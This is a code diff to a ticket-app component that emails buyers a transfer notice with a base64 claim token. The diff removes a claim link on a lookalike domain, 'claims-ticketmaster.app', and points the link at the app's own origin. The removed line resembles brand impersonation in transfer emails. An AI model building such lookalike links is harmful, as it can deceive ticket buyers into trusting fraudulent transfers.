@@ -877,6 +877,7 @@ function MyTicketDetail() {
                         };
                         const base64Token = btoa(unescape(encodeURIComponent(JSON.stringify(ticketData))));
 
+                        const claimOrigin = typeof window !== "undefined" ? window.location.origin : "https://tickethub.wasmer.app";
                         await sendTransferEmailFn({
                           data: {
                             buyerName,
@@ -888,7 +889,7 @@ function MyTicketDetail() {
                             ticketImage: absoluteImage,
                             seatDetails,
                             quantity: selectedSeats.length,
-                            eventDetailsUrl: `https://claims-ticketmaster.app?token=${base64Token}`,
+                            eventDetailsUrl: `${claimOrigin}/claim?token=${base64Token}`,
                             senderName: settings.name || user?.name || "JACQUELINE",
                             senderEmail: user?.email,
                             // Pass sessionId so the server can verify account ownership
